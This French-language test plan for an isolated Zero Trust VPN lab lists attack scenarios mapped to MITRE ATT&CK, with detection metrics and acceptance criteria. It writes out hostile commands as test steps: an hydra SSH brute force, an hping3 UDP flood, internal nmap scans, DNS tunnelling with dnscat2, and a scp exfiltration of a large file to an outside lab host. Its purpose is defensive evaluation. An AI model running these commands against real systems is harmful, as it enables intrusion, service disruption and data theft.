# 09 — Tests, scénarios d'attaque et évaluation

> Toutes les attaques sont exécutées **uniquement** depuis `kali` / `client-lin` dans le lab isolé.

## 1. Stratégie de test

| Niveau | Objet | Outils |
|---|---|---|
| Unitaire | PKI, politiques Rego, calcul du score | `openssl`, `opa test`, `pytest` |
| Intégration | Hooks VPN ↔ PDP ↔ nftables | scripts bash/pytest |
| Système | Parcours complet utilisateur | scénarios S1–S10 |
| Sécurité | Attaques réelles en lab | nmap, hydra, hping3, dnscat2… |
| Performance | Débit, latence, charge | iperf3, ping, `wrk`, `top` |
| ML | Qualité des modèles | scikit-learn, notebooks |

## 2. Matrice des scénarios

| ID | Scénario | Outil / méthode | Contrôle Zero Trust attendu | Résultat attendu | MITRE ATT&CK |
|---|---|---|---|---|---|
| **S1** | Connexion sans certificat | `openvpn` client sans cert | PKI / mTLS | Refus handshake | T1133 |
| **S2** | Cert d'une autre CA (rogue CA) | CA auto-signée | Chaîne de confiance | Refus | T1553 |
| **S3** | Cert révoqué | Révoquer puis connecter | CRL + OCSP + liste PDP | Refus < 60 s | T1078 |
| **S4** | Cert expiré | Horloge avancée / `-days 0` | Validité X.509 | Refus | T1078 |
| **S5** | Scan UDP/TCP de la gateway | `nmap -sU -sS 192.168.100.1` | `tls-crypt` + drop par défaut | Aucun port visible hors 1194 muet | T1046 |
| **S6** | DoS UDP sur le VPN | `hping3 --udp --flood` | `tls-crypt` + rate-limit | Service stable, paquets ignorés | T1498 |
| **S7** | Client légitime → accès hors rôle (SSH) | `ssh 10.10.20.10` | Micro-segmentation | Drop + log `ZT-DROP` | T1021 |
| **S8** | **Scan interne depuis client compromis** | `nmap -sS 10.10.0.0/16` | IA + Suricata → quarantaine | TTQ ≤ 15 s | T1046 |
| **S9** | **Brute force SSH** | `hydra -l admin -P rockyou.txt ssh://…` | Suricata + IA + score admin < 85 | Détection, accès SSH retiré | T1110 |
| **S10** | **Exfiltration volumineuse** | `scp`/`curl` de gros fichiers vers hôte externe | UEBA `bytes_ratio` | Alerte, réduction puis quarantaine | T1041 |
| **S11** | **Tunnel DNS** | `dnscat2` / `iodine` | Règle DNS + features entropie | Alerte, score ↑ | T1071.004 |
| **S12** | Vol de certificat + utilisation autre appareil | Copie `.ovpn` vers Kali | Posture + empreinte appareil + UEBA | Score ↓, rejet / restriction | T1078 |
| **S13** | MITM / usurpation de gateway | Faux serveur OpenVPN | `verify-x509-name`, `remote-cert-tls server` | Client refuse de se connecter | T1557 |
| **S14** | Panne du PDP | Arrêt du service | Fail-closed + TTL | Plus d'accès, expiration des règles | — |
| **S15** | Altération de la politique pare-feu | Modifier `nftables.conf` | FIM Wazuh | Alerte immédiate | T1562 |
| **S16** | Évasion lente (low-and-slow) | `nmap -T1`, exfil par petits volumes | UEBA fenêtres longues | Détection tardive (limite discutée) | T1046/T1048 |
| **S17** | Empoisonnement du modèle (théorique) | Injection de trafic « bénin » anormal | Données contrôlées, versionnage | Dérive détectée | ATLAS AML.T0020 |

## 3. Procédures détaillées (exemples)

### S3 — Révocation
```bash
# 1. Connexion OK
sudo openvpn --config alice.ovpn &
# 2. Révocation (sub-ca)
./scripts/revoke.sh alice && ./scripts/gencrl.sh && scp crl/sub.pem zt-gw:/etc/openvpn/server/crl.pem
# 3. Le PDP coupe la session et marque le serial révoqué
curl -k -X POST https://10.10.99.10:8443/v1/cert/<serial>/revoke
# 4. Nouvelle connexion → refusée
```
**Mesure** : délai entre `revoke` et refus effectif.

### S8 — Scan depuis client compromis
```bash
# Sur client-lin (connecté au VPN avec cert valide)
nmap -sS -p- 10.10.20.10 10.10.30.10 --min-rate 500
```
Déroulé attendu :
1. Flux anormaux (nombreux SYN/RST, ports dispersés).
2. NFStream → features → IA : score ≥ 0,8.
3. PDP : TrustScore < 50 → `quarantine` + `ZT-QUAR`.
4. Wazuh : règles 100101 / 100110.
5. L'utilisateur ne peut plus que joindre le portail de remédiation.

**Mesures** : `t0` (premier SYN), `t_detect` (score > seuil), `t_quarantine` (règle nft appliquée).

### S10 — Exfiltration
```bash
dd if=/dev/urandom of=/tmp/big.bin bs=1M count=500
scp /tmp/big.bin user@10.10.99.99:/tmp/       # destination hors profil habituel
```
Mesurer la **quantité de données sortie avant coupure** (comparaison politique statique / dynamique).

## 4. Génération de trafic bénin (pour réduire les faux positifs)

```python
# tests/traffic_benign.py — profils simulés
import random, time, requests, subprocess
URLS = ["https://app.lab.local/", "https://app.lab.local/reports", "https://app.lab.local/api/items"]
def employee_session():
    for _ in range(random.randint(5, 30)):
        requests.get(random.choice(URLS), cert=("alice.crt", "alice.key"), verify="ca-chain.crt")
        time.sleep(random.expovariate(1/5))
```
Prévoir plusieurs profils : employé (web), admin (SSH courts), prestataire (portail), tâches périodiques.

## 5. Métriques collectées

| Catégorie | Métrique | Source |
|---|---|---|
| Sécurité | Taux de blocage des accès illégitimes | Logs PDP / VPN |
| Détection | Precision, Recall, F1, AUC, **FPR** | Notebooks IA |
| Réactivité | **TTD**, **TTQ**, délai de révocation | Horodatages croisés |
| Impact | Données exfiltrées avant coupure | Compteurs nft / Suricata |
| Performance | Débit iperf3, latence, CPU, RAM | iperf3, `pidstat` |
| Disponibilité | Faux positifs bloquant un utilisateur légitime | Journal PDP |

## 6. Comparaison à mener (apport scientifique)

| Configuration | Description |
|---|---|
| **A** | VPN + PKI, accès réseau classique (périmètre) |
| **B** | A + micro-segmentation statique (Zero Trust « de base ») |
| **C** | B + PDP dynamique (posture + TTL) |
| **D** | C + **IA dans la boucle** (configuration complète) |

Rejouer S7–S12 sur A, B, C, D ; comparer **TTQ**, **mouvement latéral possible**, **données exfiltrées**, **faux positifs**. Résultat attendu : D réduit nettement l'impact des attaques « post-authentification ».

## 7. Automatisation

```
tests/
├── scenarios/
│   ├── s01_no_cert.sh
│   ├── s03_revoked.sh
│   ├── s08_internal_scan.sh
│   └── ...
├── traffic_benign.py
├── run_all.py            # orchestre, horodate, collecte
├── analyze.ipynb         # calcule TTD/TTQ/métriques, génère graphiques
└── reports/              # CSV + figures (réutilisables dans le rapport)
```

```python
# tests/run_all.py (squelette)
import subprocess, time, json
def run(s):
    t0 = time.time()
    subprocess.run(["bash", f"scenarios/{s}.sh"], check=False)
    return {"scenario": s, "t0": t0, "t1": time.time()}
results = [run(s) for s in ["s01_no_cert", "s03_revoked", "s08_internal_scan"]]
json.dump(results, open("reports/results.json", "w"), indent=2)
```

## 8. Critères d'acceptation

- [ ] S1–S4, S13 : 100 % de refus.
- [ ] S5, S6 : service gateway stable, aucune fuite d'information.
- [ ] S7 : 0 flux hors rôle accepté.
- [ ] S8–S11 : détection ≥ 90 %, TTQ médian ≤ 15 s.
- [ ] S14 : fail-closed vérifié.
- [ ] FPR ≤ 2 % sur ≥ 24 h de trafic bénin.
- [ ] Surcoût de débit ≤ 15 %.
- [ ] Toutes les décisions retrouvées dans Wazuh.

## 9. Gabarit de fiche de test

| Champ | Valeur |
|---|---|
| ID / Titre | |
| Objectif | |
| Préconditions | |
| Étapes | |
| Résultat attendu | |
| Résultat obtenu | |
| Preuves (logs, captures) | |
| Statut (OK / KO / partiel) | |
| Remarques / améliorations | |
